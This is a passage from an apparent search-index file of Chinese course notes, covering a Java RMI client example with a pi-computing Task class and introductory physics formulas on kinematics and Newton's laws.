\u7684\u8fdb\u7a0b\u4fdd\u6301\u8fd0\u884c\u72b6\u6001\u3002 ComputeEngine \u53ef\u7528\u4e8e\u63a5\u53d7\u547c\u53eb\uff0c\u76f4\u5230\u5c06\u5176\u7ed1\u5b9a\u4ece\u6ce8\u518c\u8868\u4e2d\u5220\u9664\u5e76\u4e14\u6ca1\u6709\u8fdc\u7a0b\u5ba2\u6237\u7aef\u62e5\u6709\u5bf9 ComputeEngine \u5bf9\u8c61\u7684\u8fdc\u7a0b\u5f15\u7528\u4e4b\u524d\uff0c\u5b83\u4e0d\u4f1a\u88ab\u56de\u6536\u3002 ComputeEngine.main \u65b9\u6cd5\u4e2d\u7684\u6700\u540e\u4e00\u6bb5\u4ee3\u7801\u5c06\u5904\u7406\u53ef\u80fd\u51fa\u73b0\u7684\u4efb\u4f55\u5f02\u5e38\u3002\u53ef\u4ee5\u5728\u4ee3\u7801\u4e2d\u5f15\u53d1\u7684\u552f\u4e00\u68c0\u67e5\u7684\u5f02\u5e38\u7c7b\u578b\u662f RemoteException \uff0c\u53ef\u4ee5\u901a\u8fc7 UnicastRemoteObject.exportObject \u8c03\u7528\u6216\u901a\u8fc7\u6ce8\u518c\u8868\u91cd\u65b0\u7ed1\u5b9a\u8c03\u7528\u6765\u5b9e\u73b0\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u8be5\u7a0b\u5e8f\u90fd\u53ea\u80fd\u6267\u884c\u6253\u5370\u9519\u8bef\u6d88\u606f\u540e\u9000\u51fa\u7684\u64cd\u4f5c\u3002\u5728\u67d0\u4e9b\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u4ece\u6545\u969c\u4e2d\u6062\u590d\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u8c03\u7528\u3002\u4f8b\u5982\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u5c1d\u8bd5\u91cd\u8bd5\u8be5\u64cd\u4f5c\uff0c\u6216\u8005\u9009\u62e9\u53e6\u4e00\u53f0\u670d\u52a1\u5668\u7ee7\u7eed\u8be5\u64cd\u4f5c\u3002","title":"4.2.7. \u4f7f\u8fdc\u7a0b\u5bf9\u8c61\u53ef\u4f9b\u5ba2\u6237\u7aef\u4f7f\u7528"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#5-rmi","text":"\u8ba1\u7b97\u5f15\u64ce\u662f\u4e00\u4e2a\u76f8\u5bf9\u7b80\u5355\u7684\u7a0b\u5e8f\uff1a\u5b83\u8fd0\u884c\u4f20\u9012\u7ed9\u5b83\u7684\u4efb\u52a1\u3002 \u8ba1\u7b97\u5f15\u64ce\u7684\u5ba2\u6237\u7aef\u66f4\u4e3a\u590d\u6742\u3002\u5ba2\u6237\u7aef\u9700\u8981\u8c03\u7528\u8ba1\u7b97\u5f15\u64ce\uff0c\u4f46\u8fd8\u5fc5\u987b\u5b9a\u4e49\u8981\u7531\u8ba1\u7b97\u5f15\u64ce\u6267\u884c\u7684\u4efb\u52a1\u3002 \u5728\u6211\u4eec\u7684\u793a\u4f8b\u4e2d\uff0c\u4e24\u4e2a\u5355\u72ec\u7684\u7c7b\u6784\u6210\u4e86\u5ba2\u6237\u7aef\u3002\u7b2c\u4e00\u4e2a\u7c7b ComputePi \u67e5\u627e\u5e76\u8c03\u7528 Compute \u5bf9\u8c61\u3002\u7b2c\u4e8c\u4e2a\u7c7b\uff0c Pi \uff0c\u5b9e\u73b0\u4e86 Task \u63a5\u53e3\u5e76\u5b9a\u4e49\u4e86\u8ba1\u7b97\u5f15\u64ce\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u3002 Pi \u7c7b\u7684\u5de5\u4f5c\u662f\u5c06 \\pi \u7b26\u53f7\u7684\u503c\u8ba1\u7b97\u4e3a\u5c0f\u6570\u4f4d\u6570\u3002 \u975e\u8fdc\u7a0b\u4efb\u52a1\u63a5\u53e3\u5b9a\u4e49\u5982\u4e0b\uff1a package compute; public interface Task<T> { T execute(); } \u8c03\u7528 Compute \u5bf9\u8c61\u7684\u65b9\u6cd5\u7684\u4ee3\u7801\u5fc5\u987b\u83b7\u5f97\u5bf9\u8be5\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u521b\u5efa Task \u5bf9\u8c61\uff0c\u7136\u540e\u8bf7\u6c42\u6267\u884c\u8be5\u4efb\u52a1\u3002 \u4efb\u52a1\u7c7b Pi \u7684\u5b9a\u4e49\u5728\u540e\u9762\u793a\u51fa\u3002 Pi \u5bf9\u8c61\u4f7f\u7528\u5355\u4e2a\u53c2\u6570\uff08\u7ed3\u679c\u7684\u6240\u9700\u7cbe\u5ea6\uff09\u6784\u9020\u3002\u4efb\u52a1\u6267\u884c\u7684\u7ed3\u679c\u662f java.math.BigDecimal \uff0c\u8868\u793a\u4ee5\u6307\u5b9a\u7684\u7cbe\u5ea6\u8ba1\u7b97\u51fa\u7684 \\pi \u7b26\u53f7\u3002 \u8fd9\u662f\u4e3b\u8981\u5ba2\u6237\u7aef\u7c7b client.ComputePi \u7684\u6e90\u4ee3\u7801\uff1a package client; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.math.BigDecimal; import compute.Compute; public class ComputePi { public static void main(String args[]) { if (System.getSecurityManager() == null) { System.setSecurityManager(new SecurityManager()); } try { String name = \"Compute\"; Registry registry = LocateRegistry.getRegistry(args[0]); Compute comp = (Compute) registry.lookup(name); Pi task = new Pi(Integer.parseInt(args[1])); BigDecimal pi = comp.executeTask(task); System.out.println(pi); } catch (Exception e) { System.err.println(\"ComputePi exception:\"); e.printStackTrace(); } } } \u4e0e ComputeEngine \u670d\u52a1\u5668\u4e00\u6837\uff0c\u5ba2\u6237\u7aef\u4ece\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\u5f00\u59cb\u3002\u6b64\u6b65\u9aa4\u662f\u5fc5\u9700\u7684\uff0c\u56e0\u4e3a\u63a5\u6536\u670d\u52a1\u5668\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\u7684\u8fc7\u7a0b\u53ef\u80fd\u9700\u8981\u4ece\u670d\u52a1\u5668\u4e0b\u8f7d\u7c7b\u5b9a\u4e49\u3002\u8981\u4f7fRMI\u4e0b\u8f7d\u7c7b\uff0c\u5fc5\u987b\u542f\u7528\u5b89\u5168\u7ba1\u7406\u5668\u3002 \u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\u540e\uff0c\u5ba2\u6237\u7aef\u5c06\u4f7f\u7528 ComputeEngine \u7528\u6765\u7ed1\u5b9a\u5176\u8fdc\u7a0b\u5bf9\u8c61\u7684\u76f8\u540c\u540d\u79f0\u6765\u6784\u5efa\u7528\u4e8e\u67e5\u627e Compute \u8fdc\u7a0b\u5bf9\u8c61\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528 LocateRegistry.getRegistry API \u6765\u5408\u6210\u5bf9\u670d\u52a1\u5668\u4e3b\u673a\u4e0a\u6ce8\u518c\u8868\u7684\u8fdc\u7a0b\u5f15\u7528\u3002\u7b2c\u4e00\u4e2a\u547d\u4ee4\u884c\u53c2\u6570 args [0] \u7684\u503c\u662f\u8fd0\u884c Compute \u5bf9\u8c61\u7684\u8fdc\u7a0b\u4e3b\u673a\u7684\u540d\u79f0\u3002\u7136\u540e\uff0c\u5ba2\u6237\u7aef\u5728\u6ce8\u518c\u8868\u4e0a\u8c03\u7528 lookup \u65b9\u6cd5\uff0c\u4ee5\u5728\u670d\u52a1\u5668\u4e3b\u673a\u7684\u6ce8\u518c\u8868\u4e2d\u6309\u540d\u79f0\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\u3002\u4f7f\u7528\u7684 LocateRegistry.getRegistry \u7684\u7279\u5b9a\u91cd\u8f7d\uff08\u5177\u6709\u5355\u4e2a String \u53c2\u6570\uff09\u8fd4\u56de\u5bf9\u547d\u540d\u4e3b\u673a\u548c\u9ed8\u8ba4\u6ce8\u518c\u8868\u7aef\u53e3 1099 \u5904\u7684\u6ce8\u518c\u8868\u7684\u5f15\u7528\u3002\u5982\u679c\u5728 1099 \u4ee5\u5916\u7684\u7aef\u53e3\u521b\u5efa\u4e86\u6ce8\u518c\u8868\uff0c\u5219\u5fc5\u987b\u4f7f\u7528\u5177\u6709 int \u53c2\u6570\u7684\u91cd\u8f7d\u3002 \u63a5\u4e0b\u6765\uff0c\u5ba2\u6237\u7aef\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Pi \u5bf9\u8c61\uff0c\u5c06\u89e3\u6790\u4e3a\u6574\u6570\u7684\u7b2c\u4e8c\u4e2a\u547d\u4ee4\u884c\u53c2\u6570 args [1] \u7684\u503c\u4f20\u9012\u7ed9 Pi \u6784\u9020\u51fd\u6570\u3002\u6b64\u53c2\u6570\u6307\u793a\u5728\u8ba1\u7b97\u4e2d\u4f7f\u7528\u7684\u5c0f\u6570\u4f4d\u6570\u3002\u6700\u540e\uff0c\u5ba2\u6237\u7aef\u8c03\u7528 Compute \u8fdc\u7a0b\u5bf9\u8c61\u7684 executeTask \u65b9\u6cd5\u3002\u4f20\u9012\u7ed9 executeTask \u8c03\u7528\u7684\u5bf9\u8c61\u5c06\u8fd4\u56de BigDecimal \u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u5176\u5b58\u50a8\u5728\u53d8\u91cf result \u4e2d\u3002\u6700\u540e\uff0c\u7a0b\u5e8f\u5c06\u6253\u5370\u7ed3\u679c\u3002\u4e0b\u56fe\u63cf\u8ff0\u4e86 ComputePi \u5ba2\u6237\u7aef\uff0c rmiregistry \u548c ComputeEngine \u4e4b\u95f4\u7684\u6d88\u606f\u6d41\u3002 \\text{Figure 5. \u6d88\u606f\u6d41} Pi \u7c7b\u5b9e\u73b0 Task \u63a5\u53e3\uff0c\u5e76\u5c06 \\pi \u7b26\u53f7\u7684\u503c\u8ba1\u7b97\u4e3a\u6307\u5b9a\u7684\u5c0f\u6570\u4f4d\u6570\u3002\u5bf9\u4e8e\u6b64\u793a\u4f8b\uff0c\u5b9e\u9645\u7b97\u6cd5\u5e76\u4e0d\u91cd\u8981\u3002\u91cd\u8981\u7684\u662f\u8be5\u7b97\u6cd5\u7684\u8ba1\u7b97\u91cf\u5f88\u5927\uff0c\u8fd9\u610f\u5473\u7740\u60a8\u5e0c\u671b\u5728\u529f\u80fd\u5f3a\u5927\u7684\u670d\u52a1\u5668\u4e0a\u6267\u884c\u8be5\u7b97\u6cd5\u3002 \u4ee5\u4e0b\u662f\u5b9e\u73b0 Task \u63a5\u53e3\u7684\u7c7b client.Pi \u7684\u6e90\u4ee3\u7801\uff1a package client; import compute.Task; import java.io.Serializable; import java.math.BigDecimal; public class Pi implements Task<BigDecimal>, Serializable { private static final long serialVersionUID = 227L; /** constants used in pi computation */ private static final BigDecimal FOUR = BigDecimal.valueOf(4); /** rounding mode to use during pi computation */ private static final int roundingMode = BigDecimal.ROUND_HALF_EVEN; /** digits of precision after the decimal point */ private final int digits; /** * Construct a task to calculate pi to the specified precision. */ public Pi(int digits) { this.digits = digits; } /** * Calculate pi. */ public BigDecimal execute() { return computePi(digits); } /** * Compute the value of pi to the specified number of digits after the decimal * point. The value is computed using Machin's formula: * * pi/4 = 4*arctan(1/5) - arctan(1/239) * * and a power series expansion of arctan(x) to sufficient precision. */ public static BigDecimal computePi(int digits) { int scale = digits + 5; BigDecimal arctan1_5 = arctan(5, scale); BigDecimal arctan1_239 = arctan(239, scale); BigDecimal pi = arctan1_5.multiply(FOUR).subtract(arctan1_239).multiply(FOUR); return pi.setScale(digits, BigDecimal.ROUND_HALF_UP); } /** * Compute the value, in radians, of the arctangent of the inverse of the * supplied integer to the specified number of digits after the decimal point. * The value is computed using the power series expansion for the arc tangent: * * arctan(x) = x - (x^3)/3 + (x^5)/5 - (x^7)/7 + (x^9)/9 ... */ public static BigDecimal arctan(int inverseX, int scale) { BigDecimal result, numer, term; BigDecimal invX = BigDecimal.valueOf(inverseX); BigDecimal invX2 = BigDecimal.valueOf(inverseX * inverseX); numer = BigDecimal.ONE.divide(invX, scale, roundingMode); result = numer; int i = 1; do { numer = numer.divide(invX2, scale, roundingMode); int denom = 2 * i + 1; term = numer.divide(BigDecimal.valueOf(denom), scale, roundingMode); if ((i % 2) != 0) { result = result.subtract(term); } else { result = result.add(term); } i++; } while (term.compareTo(BigDecimal.ZERO) != 0); return result; } } \u8bf7\u6ce8\u610f\uff0c\u6240\u6709\u53ef\u5e8f\u5217\u5316\u7c7b\uff08\u65e0\u8bba\u5b83\u4eec\u662f\u76f4\u63a5\u5b9e\u73b0\u8fd8\u662f\u95f4\u63a5\u5b9e\u73b0 Serializable \u63a5\u53e3\uff09\u90fd\u5fc5\u987b\u58f0\u660e\u4e00\u4e2a\u540d\u4e3a serialVersionUID \u7684\u79c1\u6709\u9759\u6001\u6700\u7ec8\u5b57\u6bb5\uff0c\u4ee5\u786e\u4fdd\u7248\u672c\u4e4b\u95f4\u7684\u5e8f\u5217\u5316\u517c\u5bb9\u6027\u3002\u5982\u679c\u6ca1\u6709\u53d1\u5e03\u8be5\u7c7b\u7684\u5148\u524d\u7248\u672c\uff0c\u5219\u8be5\u5b57\u6bb5\u7684\u503c\u53ef\u4ee5\u662f\u4efb\u4f55\u957f\u503c\uff0c\u7c7b\u4f3c\u4e8e Pi \u4f7f\u7528\u7684 227L \uff0c\u53ea\u8981\u8be5\u503c\u5728\u4ee5\u540e\u7684\u7248\u672c\u4e2d\u59cb\u7ec8\u4f7f\u7528\u5373\u53ef\u3002\u5982\u679c\u5df2\u53d1\u5e03\u8be5\u7c7b\u7684\u5148\u524d\u7248\u672c\u800c\u6ca1\u6709\u663e\u5f0f serialVersionUID \u58f0\u660e\uff0c\u4f46\u662f\u4e0e\u8be5\u7248\u672c\u7684\u5e8f\u5217\u5316\u517c\u5bb9\u6027\u5f88\u91cd\u8981\uff0c\u5219\u5fc5\u987b\u5c06\u5148\u524d\u7248\u672c\u7684\u9ed8\u8ba4\u9690\u5f0f\u8ba1\u7b97\u503c\u7528\u4f5c\u65b0\u7248\u672c\u7684\u663e\u5f0f\u58f0\u660e\u7684\u503c\u3002\u53ef\u4ee5\u9488\u5bf9\u5148\u524d\u7248\u672c\u8fd0\u884c serialver \u5de5\u5177\uff0c\u4ee5\u786e\u5b9a\u5176\u9ed8\u8ba4\u8ba1\u7b97\u503c\u3002 \u6b64\u793a\u4f8b\u6700\u6709\u8da3\u7684\u529f\u80fd\u662f\uff0c\u5728\u5c06 Pi \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9 executeTask \u65b9\u6cd5\u4e4b\u524d\uff0c Compute \u5b9e\u73b0\u5bf9\u8c61\u6c38\u8fdc\u4e0d\u9700\u8981 Pi \u7c7b\u7684\u5b9a\u4e49\u3002\u6b64\u65f6\uff0c RMI \u5c06\u7528\u4e8e\u8be5\u7c7b\u7684\u4ee3\u7801\u52a0\u8f7d\u5230 Compute \u5bf9\u8c61\u7684 Java \u865a\u62df\u673a\u4e2d\uff0c\u8c03\u7528 execute \u65b9\u6cd5\uff0c\u7136\u540e\u6267\u884c\u4efb\u52a1\u7684\u4ee3\u7801\u3002\u7ed3\u679c\uff08\u5728 Pi \u4efb\u52a1\u7684\u60c5\u51b5\u4e0b\u662f BigDecimal \u5bf9\u8c61\uff09\u5c06\u8fd4\u56de\u7ed9\u8c03\u7528\u5ba2\u6237\u7aef\uff0c\u5728\u5ba2\u6237\u7aef\u7528\u4e8e\u6253\u5370\u8ba1\u7b97\u7ed3\u679c\u3002 \u63d0\u4f9b\u7684 Task \u5bf9\u8c61\u8ba1\u7b97 Pi \u503c\u7684\u4e8b\u5b9e\u4e0e ComputeEngine \u5bf9\u8c61\u65e0\u5173\u3002\u60a8\u8fd8\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u4efb\u52a1\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u4f7f\u7528\u6982\u7387\u7b97\u6cd5\u6765\u751f\u6210\u968f\u673a\u8d28\u6570\u3002\u8be5\u4efb\u52a1\u4e5f\u9700\u8981\u5927\u91cf\u8ba1\u7b97\uff0c\u56e0\u6b64\u662f\u4f20\u9012\u7ed9 ComputeEngine \u7684\u5f88\u597d\u7684\u9009\u62e9\uff0c\u4f46\u662f\u5b83\u9700\u8981\u975e\u5e38\u4e0d\u540c\u7684\u4ee3\u7801\u3002\u5f53 Task \u5bf9\u8c61\u4f20\u9012\u5230 Compute \u5bf9\u8c61\u65f6\uff0c\u4e5f\u53ef\u4ee5\u4e0b\u8f7d\u6b64\u4ee3\u7801\u3002\u5c31\u50cf\u5728\u9700\u8981\u65f6\u5f15\u5165\u7528\u4e8e\u8ba1\u7b97 \\pi \u7b26\u53f7\u7684\u7b97\u6cd5\u7684\u65b9\u5f0f\u4e00\u6837\uff0c\u5c06\u5728\u9700\u8981\u65f6\u5f15\u5165\u751f\u6210\u968f\u673a\u7d20\u6570\u7684\u4ee3\u7801\u3002 Compute \u5bf9\u8c61\u4ec5\u77e5\u9053\u5b83\u63a5\u6536\u7684\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u5b9e\u73b0\u4e86 execute \u65b9\u6cd5\u3002 Compute \u5bf9\u8c61\u4e0d\u77e5\u9053\uff0c\u4e5f\u4e0d\u9700\u8981\u77e5\u9053\u5b9e\u73b0\u7684\u4f5c\u7528\u3002","title":"5. \u5982\u4f55\u521b\u5efa\u4e00\u4e2a RMI \u5ba2\u6237\u7aef"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#6","text":"\u8fd9\u4e00\u90e8\u5206\u6bcf\u4e2a\u7cfb\u7edf\u90fd\u4e0d\u592a\u4e00\u6837\uff0c\u63a8\u8350\u5927\u5bb6\u76f4\u63a5\u770b \u5b98\u65b9\u6587\u6863 \u3002 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6. \u7f16\u8bd1\u5e76\u8fd0\u884c"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/","text":"\u7b2c\u4e00\u7ae0 \u8fd0\u52a8\u548c\u529b # \u76ee\u5f55 # \u7b2c\u4e00\u7ae0 \u8fd0\u52a8\u548c\u529b \u76ee\u5f55 1. \u8d28\u70b9\u8fd0\u52a8\u5b66 1.1. \u8d28\u70b9\u8fd0\u52a8\u7684\u63cf\u8ff0 1.1.1. \u4f4d\u7f6e\u77e2\u91cf 1.1.2. \u4f4d\u79fb 1.1.3. \u8fd0\u52a8\u51fd\u6570 1.1.4. \u5300\u52a0\u901f\u76f4\u7ebf\u8fd0\u52a8\u7684\u8fd0\u52a8\u65b9\u7a0b 1.1.5. \u901f\u5ea6 1.1.6. \u52a0\u901f\u5ea6 1.2. \u629b\u4f53\u8fd0\u52a8 1.2.1. \u8fd0\u52a8\u65b9\u7a0b 1.2.2. \u5c04\u7a0b\u4e0e\u5c04\u9ad8 1.3. \u5706\u5468\u8fd0\u52a8 1.3.1. \u5207\u5411\u52a0\u901f\u5ea6 1.3.2. \u6cd5\u5411\u52a0\u901f\u5ea6 1.3.3. \u89d2\u901f\u5ea6 1.3.4. \u89d2\u52a0\u901f\u5ea6 1.3.5. \u7ebf\u901f\u5ea6\u4e0e\u89d2\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb 1.3.6. \u5207\u5411\u52a0\u901f\u5ea6\u4e0e\u89d2\u52a0\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb 1.3.7. \u6cd5\u5411\u52a0\u901f\u5ea6\u4e0e\u89d2\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb 2. \u725b\u987f\u8fd0\u52a8\u5b9a\u5f8b\u53ca\u5176\u5e94\u7528 2.1. \u725b\u987f\u7b2c\u4e00\u5b9a\u7406 - \u60ef\u6027\u5b9a\u5f8b 2.2. \u725b\u987f\u7b2c\u4e8c\u5b9a\u5f8b 2.3. \u725b\u987f\u7b2c\u4e09\u5b9a\u5f8b 2.4. \u89e3\u9898\u6b65\u9aa4 2.5. \u60ef\u6027\u529b 1. \u8d28\u70b9\u8fd0\u52a8\u5b66 # 1.1. \u8d28\u70b9\u8fd0\u52a8\u7684\u63cf\u8ff0 # 1.1.1. \u4f4d\u7f6e\u77e2\u91cf # \\overrightarrow{r} 1.1.2. \u4f4d\u79fb # \\Delta \\overrightarrow{r} 1.1.3. \u8fd0\u52a8\u51fd\u6570 # \\overrightarrow{r}(t) 1.1.4. \u5300\u52a0\u901f\u76f4\u7ebf\u8fd0\u52a8\u7684\u8fd0\u52a8\u65b9\u7a0b # x = x_0 + v_0 t + \\frac{1}{2} at^2 v^2 - v_0^2 = 2a(x - x_0) 1.1.5. \u901f\u5ea6 # \\overrightarrow{v} = \\dfrac{d \\overrightarrow{r}}{d {t}} 1.1.6. \u52a0\u901f\u5ea6 # \\overrightarrow{a} = \\dfrac{d \\overrightarrow{v}}{d{t}} = \\dfrac{d^2 \\overrightarrow{r}}{d {t}^2} 1.2. \u629b\u4f53\u8fd0\u52a8 # 1.2.1. \u8fd0\u52a8\u65b9\u7a0b # \u4ee5 \\overrightarrow{v_0} \u8868\u793a\u7269\u4f53\u7684\u521d\u901f\u5ea6\uff0c\u4ee5 \\theta_0 \u8868\u793a\u629b\u5c04\u89d2\uff0c\u5219 \\overrightarrow{v_0} \u5728 Ox \u548c Oy \u8f74\u4e0a\u7684\u5206\u91cf\u662f v_{0x} = v_0 \\cos \\theta_0 v_{0y} = v_0 \\sin \\theta_0 \u8fd0\u52a8\u5b66\u65b9\u7a0b\u4e3a \\overrightarrow{r} = (v_0 \\cos \\theta_0 i + v_0 \\sin \\theta_0)t - \\frac{1}{2} gt^2 j \u4f7f\u7528\u77e2\u91cf \\overrightarrow{v_0} \u548c \\overrightarrow{g} \u6765\u8868\u793a\uff0c\u5219\u4e0a\u5f0f\u53ef\u5199\u6210 \\overrightarrow{r} = \\overrightarrow{v_0} + \\frac{1}{2} \\overrightarrow{g}t^2 1.2.2. \u5c04\u7a0b\u4e0e\u5c04\u9ad8 # \u82e5\u6d88\u53bb\u8fd0\u52a8\u65b9\u7a0b\u4e2d\u7684 t \uff0c\u5219\u5f97\u629b\u4f53\u7684\u8f68\u8ff9\u65b9\u7a0b\u4e3a y = x\\tan \\theta_0 - \\frac{1}{2} \\frac{gx^2}{v_0^2 \\cos^2 \\theta_0} \u5219\u629b\u4f53\u8fd0\u52a8\u7684\u5c04\u7a0b\u4e3a x_m = \\frac{v_0^2 \\sin 2\\theta_0}{g} \u5c04\u9ad8\u4e3a y_m = \\frac{v_0^2 \\sin ^2\\theta_0}{2g} \u5f53 y = y_m \u65f6\uff0c x = \\dfrac{1}{2}x_m \uff0c\u5373\u5c04\u7a0b\u7684\u4e00\u534a\u3002 1.3. \u5706\u5468\u8fd0\u52a8 # 1.3.1. \u5207\u5411\u52a0\u901f\u5ea6 # a_t = \\dfrac{d v}{d t} e_t 1.3.2. \u6cd5\u5411\u52a0\u901f\u5ea6 # a_n = \\dfrac{v^2}{R} e_n 1.3.3. \u89d2\u901f\u5ea6 # \\omega = \\lim\\limits_{\\Delta t \\to 0}{\\frac{\\Delta \\theta}{\\Delta t}} = \\dfrac{d \\theta}{d t} 1.3.4. \u89d2\u52a0\u901f\u5ea6 # \\alpha = \\lim\\limits_{\\Delta t \\to 0}{\\frac{\\Delta \\omega}{\\Delta t}} = \\dfrac{d \\omega}{d t} 1.3.5. \u7ebf\u901f\u5ea6\u4e0e\u89d2\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb # v = R \\omega 1.3.6. \u5207\u5411\u52a0\u901f\u5ea6\u4e0e\u89d2\u52a0\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb # a_t = R \\alpha 1.3.7. \u6cd5\u5411\u52a0\u901f\u5ea6\u4e0e\u89d2\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb # a_n = \\dfrac{v^2}{R} = v \\omega = R \\omega^2 2. \u725b\u987f\u8fd0\u52a8\u5b9a\u5f8b\u53ca\u5176\u5e94\u7528 # 2.1. \u725b\u987f\u7b2c\u4e00\u5b9a\u7406 - \u60ef\u6027\u5b9a\u5f8b # \u5b9a\u4e49 \uff1a\u4efb\u4f55\u7269\u4f53\uff0c\u5982\u679c\u6ca1\u6709\u529b\u4f5c\u7528\u5728\u5b83\u4e0a\u9762\uff0c\u90fd\u5c06\u4fdd\u6301\u5176\u901f\u5ea6\u3002\u9759\u6b62\u7684\u4ecd\u7136\u9759\u6b62\uff0c\u8fd0\u52a8\u7684\u5c06\u505a\u5300\u901f\u76f4\u7ebf\u8fd0\u52a8\u3002 2.2. \u725b\u987f\u7b2c\u4e8c\u5b9a\u5f8b # \\overrightarrow{F} = m \\overrightarrow{a} \u5b9a\u4e49 \uff1a\u8d28\u70b9\u7684\u52a0\u901f\u5ea6\u4e0e\u5b83\u6240\u53d7\u7684\u5408\u529b\u7684\u65b9\u5411\u5411\u540c\uff0c\u52a0\u901f\u5ea6\u7684\u5927\u5c0f\u4e0e\u5b83\u7684\u8d28\u91cf\u6210\u53cd\u6bd4\uff0c\u4e0e\u5b83\u6240\u53d7\u7684\u5408\u529b\u6210\u6b63\u6bd4\u3002 \\overrightarrow{F} = \\frac{d \\overrightarrow{p}}{d t} \u5b9a\u4e49 \uff1a\u7269\u4f53\u7684\u52a8\u91cf\u5bf9\u65f6\u95f4\u7684\u53d8\u5316\u7387\u4e0e\u6240\u53d7\u7684\u5916\u529b\u6210\u6b63\u6bd4\uff0c\u5e76\u53d1\u751f\u5728\u5916\u529b\u7684\u65b9\u5411\u4e0a\u3002 2.3. \u725b\u987f\u7b2c\u4e09\u5b9a\u5f8b # \u5b9a\u4e49 \uff1a\u7269\u4f53\u95f4\u7684\u4f5c\u7528\u529b\u6210\u5bf9\u51fa\u73b0\u3002\u901a\u5e38\u6210\u4e3a\u4f5c\u7528\u529b\u4e0e\u53cd\u4f5c\u7528\u529b\u3002 \\overrightarrow F_{AB} = - \\overrightarrow F_{BA} 2.4. \u89e3\u9898\u6b65\u9aa4 # \u9009\u5b9a\u5bf9\u8c61\uff0c\u9694\u79bb\u7269\u4f53 \u53d7\u529b\u5206\u6790\uff0c\u753b\u793a\u529b\u56fe \u5206\u6790\u8fd0\u52a8 \u9009\u5750\u6807\u7cfb\uff0c\u5217\u65b9\u7a0b\uff0c\u6c42\u89e3\u672a\u77e5\u91cf \u68c0\u9a8c\u4e0e\u8ba8\u8bba 2.5. \u60ef\u6027\u529b # \u60ef\u6027\u529b\uff08Inertial force\uff09\u7684\u5927\u5c0f\u7b49\u4e8e\u7269\u4f53\u7684\u8d28\u91cf m \u548c\u975e\u60ef\u6027\u7cfb\u52a0\u901f\u5ea6 a \u7684\u4e58\u79ef\uff0c\u4f46\u65b9\u5411\u548c a \u76f8\u53cd\u3002\u5982\u679c\u7528 F_i \u8868\u793a\u60ef\u6027\u529b\uff0c\u5219 F_i = -ma","title":"1.\u7b2c\u4e00\u7ae0 \u8fd0\u52a8\u548c\u529b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#_1","text":"","title":"\u7b2c\u4e00\u7ae0 \u8fd0\u52a8\u548c\u529b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#_2","text":"\u7b2c\u4e00\u7ae0 \u8fd0\u52a8\u548c\u529b \u76ee\u5f55 1. \u8d28\u70b9\u8fd0\u52a8\u5b66 1.1. \u8d28\u70b9\u8fd0\u52a8\u7684\u63cf\u8ff0 1.1.1. \u4f4d\u7f6e\u77e2\u91cf 1.1.2. \u4f4d\u79fb 1.1.3. \u8fd0\u52a8\u51fd\u6570 1.1.4. \u5300\u52a0\u901f\u76f4\u7ebf\u8fd0\u52a8\u7684\u8fd0\u52a8\u65b9\u7a0b 1.1.5. \u901f\u5ea6 1.1.6. \u52a0\u901f\u5ea6 1.2. \u629b\u4f53\u8fd0\u52a8 1.2.1. \u8fd0\u52a8\u65b9\u7a0b 1.2.2. \u5c04\u7a0b\u4e0e\u5c04\u9ad8 1.3. \u5706\u5468\u8fd0\u52a8 1.3.1. \u5207\u5411\u52a0\u901f\u5ea6 1.3.2. \u6cd5\u5411\u52a0\u901f\u5ea6 